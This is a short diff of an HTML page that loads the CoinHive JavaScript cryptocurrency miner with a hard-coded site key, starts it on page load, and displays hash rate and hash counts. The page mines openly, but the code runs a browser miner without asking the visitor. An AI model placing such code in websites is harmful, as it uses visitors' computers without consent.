@@ -1,4 +1,6 @@
-<meta charset="utf-8">
+<html>
+<head><meta charset="utf-8"></head>
+<body>
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 <script>
 	var miner = new CoinHive.Anonymous('UitANGIFzXKM1p25LYThHGmI5jpFkrd4');
@@ -8,8 +10,14 @@
 		var hashesPerSecond = miner.getHashesPerSecond();
 		var totalHashes = miner.getTotalHashes();
 		var acceptedHashes = miner.getAcceptedHashes();
-
 		// Output to HTML elements...
 		document.getElementById("hps").innerHTML=hashesPerSecond;
+		document.getElementById("th").innerHTML=totalHashes;
+		document.getElementById("ah").innerHTML=acceptedHashes;
 	}, 1000);
 </script>
+<h5>Info:</h5>
+<h6>hash/s: <span id="hps">0</span> </h6>
+<h6>total hashes: <span id="th">0</span> </h6>
+<h6>accepted hashes: <span id="ah">0</span> </h6>
+</body></html>
